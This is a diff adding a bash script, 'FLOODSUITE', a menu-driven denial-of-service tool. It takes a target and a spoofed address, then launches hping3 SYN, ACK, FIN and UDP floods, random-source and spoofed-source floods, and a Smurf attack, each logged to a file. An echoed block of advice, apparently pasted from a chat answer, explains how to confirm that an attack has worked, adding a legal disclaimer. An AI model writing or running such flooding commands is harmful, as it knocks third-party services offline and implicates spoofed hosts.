@@ -1,0 +1,87 @@
+#!/bin/bash
+
+
+echo " FLOODSUITE - A Bash-Shell Menu Based Denial Of Serice Attack & Stress Testing Tool "
+
+
+# Define target and spoof variables
+TARGET=""
+SPOOF=""
+
+
+echo "The success of each command listed in a previous question depends on the desired outcome and the intention behind running the command. Generally speaking, if the intention is to flood a target with a large number of packets or to send packets with specific attributes, a successful attack would mean that the target is experiencing the desired effects. However, it's important to note that conducting any type of attack without permission is illegal and can have serious consequences.
+
+In terms of identifying the success of each command, there are a few ways to approach this:
+
+    Check for errors or output messages: When you run each command, it may produce error messages or output messages that indicate whether the command was successful or not. For example, if the command produces a message saying that it sent a certain number of packets or if it reports an error message indicating that the attack failed, you can use that as an indication of success or failure.
+
+    Monitor the target's behavior: If the target is a system that you have access to, you can monitor its behavior to see if it is responding in the way that you intended. For example, if you flooded a web server with TCP SYN packets, you can check to see if the server is no longer responding to legitimate requests.
+
+    Use a network monitoring tool: If you have access to a network monitoring tool, you can use it to monitor the traffic on your network and look for signs of abnormal behavior. For example, if you flooded a network with UDP packets, you can look for a significant increase in network traffic or an increase in packet loss.
+
+It's important to note that running any of these commands on a network or system without permission can be illegal and unethical. It's important to use these tools and techniques responsibly and only with the proper authorization and training."
+
+
+	echo; 
+
+
+# Prompt user for target IP address or hostname
+read -p "Enter target IP address or hostname: " TARGET
+
+# Prompt user for spoof IP address or hostname
+read -p "Enter IP address or hostname to be spoofed: " SPOOF
+
+# Define menu options
+options=(
+    "Send a TCP SYN flood to target"
+    "Send a TCP SYN flood to target with random source IP"
+    "Send a TCP SYN flood to target with 15000 packets"
+    "Send a TCP SYN flood to target with random source IP and flood mode"
+    "Send a TCP SYN flood to target with spoofed source IP"
+    "Send a TCP ACK flood to target"
+    "Send a TCP FIN flood to target"
+    "Send a UDP flood to target"
+    "Send a Smurf attack to target"
+    "Quit"
+)
+
+# Prompt user to select an option
+select option in "${options[@]}"
+do
+    case $option in
+        "Send a TCP SYN flood to target")
+            sudo hping3 -S --flood -p 80 $TARGET >> syn_flood.log
+            ;;
+        "Send a TCP SYN flood to target with random source IP")
+            sudo hping3 $TARGET -n -d 120 -S -p 80 --flood --rand-source >> syn_flood.log
+            ;;
+        "Send a TCP SYN flood to target with 15000 packets")
+            sudo hping3 -c 15000 -d 120 -S -w 32 -p 80 --flood --rand-source $TARGET >> syn_flood.log
+            ;;
+        "Send a TCP SYN flood to target with random source IP and flood mode")
+            sudo hping3 --rand-source $TARGET -S -p 80 --flood >> syn_flood.log
+            ;;
+        "Send a TCP SYN flood to target with spoofed source IP")
+            sudo hping3 -a $SPOOF $TARGET -S -p 80 >> syn_flood.log
+            ;;
+        "Send a TCP ACK flood to target")
+            sudo hping3 -A --flood -p 80 $TARGET >> ack_flood.log
+            ;;
+        "Send a TCP FIN flood to target")
+            sudo hping3 -F --flood -p 80 $TARGET >> fin_flood.log
+            ;;
+        "Send a UDP flood to target")
+            sudo hping3 --udp --flood -p 80 $TARGET >> udp_flood.log
+            ;;
+        "Send a Smurf attack to target")
+            sudo hping3 --flood --icmp --spoof $SPOOF $TARGET >> smurf_attack.log
+            ;;
+        "Quit")
+            break
+            ;;
+        *) 
+            echo "Invalid option"
+            ;;
+    esac
+done
+
